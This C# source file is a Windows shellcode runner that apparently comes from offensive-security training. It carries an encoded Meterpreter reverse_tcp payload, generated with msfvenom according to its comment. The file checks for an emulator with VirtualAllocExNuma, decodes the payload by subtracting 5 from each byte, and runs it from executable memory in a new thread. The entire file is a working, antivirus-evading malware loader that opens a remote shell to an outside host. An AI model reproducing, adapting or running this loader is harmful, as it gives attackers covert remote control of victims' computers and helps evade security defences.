using System.Runtime.InteropServices;
using System;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void runner()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[511] { 0x01, 0x4d, 0x88, 0xe9, 0xf5, 0xed, 0xd1, 0x05, 0x05, 0x05, 0x46, 0x56, 0x46, 0x55, 0x57, 0x56, 0x5b, 0x4d, 0x36, 0xd7, 0x6a, 0x4d, 0x90, 0x57, 0x65, 0x4d, 0x90, 0x57, 0x1d, 0x4d, 0x90, 0x57, 0x25, 0x4d, 0x14, 0xbc, 0x4f, 0x4f, 0x4d, 0x90, 0x77, 0x55, 0x52, 0x36, 0xce, 0x4d, 0x36, 0xc5, 0xb1, 0x41, 0x66, 0x81, 0x07, 0x31, 0x25, 0x46, 0xc6, 0xce, 0x12, 0x46, 0x06, 0xc6, 0xe7, 0xf2, 0x57, 0x46, 0x56, 0x4d, 0x90, 0x57, 0x25, 0x90, 0x47, 0x41, 0x4d, 0x06, 0xd5, 0x6b, 0x86, 0x7d, 0x1d, 0x10, 0x07, 0x14, 0x8a, 0x77, 0x05, 0x05, 0x05, 0x90, 0x85, 0x8d, 0x05, 0x05, 0x05, 0x4d, 0x8a, 0xc5, 0x79, 0x6c, 0x4d, 0x06, 0xd5, 0x55, 0x90, 0x4d, 0x1d, 0x49, 0x90, 0x45, 0x25, 0x4e, 0x06, 0xd5, 0xe8, 0x5b, 0x52, 0x36, 0xce, 0x4d, 0x04, 0xce, 0x46, 0x90, 0x39, 0x8d, 0x4d, 0x06, 0xdb, 0x4d, 0x36, 0xc5, 0x46, 0xc6, 0xce, 0x12, 0xb1, 0x46, 0x06, 0xc6, 0x3d, 0xe5, 0x7a, 0xf6, 0x51, 0x08, 0x51, 0x29, 0x0d, 0x4a, 0x3e, 0xd6, 0x7a, 0xdd, 0x5d, 0x49, 0x90, 0x45, 0x29, 0x4e, 0x06, 0xd5, 0x6b, 0x46, 0x90, 0x11, 0x4d, 0x49, 0x90, 0x45, 0x21, 0x4e, 0x06, 0xd5, 0x46, 0x90, 0x09, 0x8d, 0x4d, 0x06, 0xd5, 0x46, 0x5d, 0x46, 0x5d, 0x63, 0x5e, 0x5f, 0x46, 0x5d, 0x46, 0x5e, 0x46, 0x5f, 0x4d, 0x88, 0xf1, 0x25, 0x46, 0x57, 0x04, 0xe5, 0x5d, 0x46, 0x5e, 0x5f, 0x4d, 0x90, 0x17, 0xee, 0x50, 0x04, 0x04, 0x04, 0x62, 0x4e, 0xc3, 0x7c, 0x78, 0x37, 0x64, 0x38, 0x37, 0x05, 0x05, 0x46, 0x5b, 0x4e, 0x8e, 0xeb, 0x4d, 0x86, 0xf1, 0xa5, 0x06, 0x05, 0x05, 0x4e, 0x8e, 0xea, 0x4e, 0xc1, 0x07, 0x05, 0x06, 0xc0, 0xc5, 0xad, 0x32, 0xd7, 0x46, 0x59, 0x4e, 0x8e, 0xe9, 0x51, 0x8e, 0xf6, 0x46, 0xbf, 0x51, 0x7c, 0x2b, 0x0c, 0x04, 0xda, 0x51, 0x8e, 0xef, 0x6d, 0x06, 0x06, 0x05, 0x05, 0x5e, 0x46, 0xbf, 0x2e, 0x85, 0x70, 0x05, 0x04, 0xda, 0x6f, 0x0f, 0x46, 0x63, 0x55, 0x55, 0x52, 0x36, 0xce, 0x52, 0x36, 0xc5, 0x4d, 0x04, 0xc5, 0x4d, 0x8e, 0xc7, 0x4d, 0x04, 0xc5, 0x4d, 0x8e, 0xc6, 0x46, 0xbf, 0xef, 0x14, 0xe4, 0xe5, 0x04, 0xda, 0x4d, 0x8e, 0xcc, 0x6f, 0x15, 0x46, 0x5d, 0x51, 0x8e, 0xe7, 0x4d, 0x8e, 0xfe, 0x46, 0xbf, 0x9e, 0xaa, 0x79, 0x66, 0x04, 0xda, 0x8a, 0xc5, 0x79, 0x0f, 0x4e, 0x04, 0xd3, 0x7a, 0xea, 0xed, 0x98, 0x05, 0x05, 0x05, 0x4d, 0x88, 0xf1, 0x15, 0x4d, 0x8e, 0xe7, 0x52, 0x36, 0xce, 0x6f, 0x09, 0x46, 0x5d, 0x4d, 0x8e, 0xfe, 0x46, 0xbf, 0x07, 0xde, 0xcd, 0x64, 0x04, 0xda, 0x88, 0xfd, 0x05, 0x83, 0x5a, 0x4d, 0x88, 0xc9, 0x25, 0x63, 0x8e, 0xfb, 0x6f, 0x45, 0x46, 0x5e, 0x6d, 0x05, 0x15, 0x05, 0x05, 0x46, 0x5d, 0x4d, 0x8e, 0xf7, 0x4d, 0x36, 0xce, 0x46, 0xbf, 0x5d, 0xa9, 0x58, 0xea, 0x04, 0xda, 0x4d, 0x8e, 0xc8, 0x4e, 0x8e, 0xcc, 0x52, 0x36, 0xce, 0x4e, 0x8e, 0xf5, 0x4d, 0x8e, 0xdf, 0x4d, 0x8e, 0xfe, 0x46, 0xbf, 0x07, 0xde, 0xcd, 0x64, 0x04, 0xda, 0x88, 0xfd, 0x05, 0x82, 0x2d, 0x5d, 0x46, 0x5c, 0x5e, 0x6d, 0x05, 0x45, 0x05, 0x05, 0x46, 0x5d, 0x6f, 0x05, 0x5f, 0x46, 0xbf, 0x10, 0x34, 0x14, 0x35, 0x04, 0xda, 0x5c, 0x5e, 0x46, 0xbf, 0x7a, 0x73, 0x52, 0x66, 0x04, 0xda, 0x4e, 0x04, 0xd3, 0xee, 0x41, 0x04, 0x04, 0x04, 0x4d, 0x06, 0xc8, 0x4d, 0x2e, 0xcb, 0x4d, 0x8a, 0xfb, 0x7a, 0xb9, 0x46, 0x04, 0xec, 0x5d, 0x6f, 0x05, 0x5e, 0xc0, 0xe5, 0x22, 0x2f, 0x0f, 0x46, 0x8e, 0xdf, 0x04, 0xda };


            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

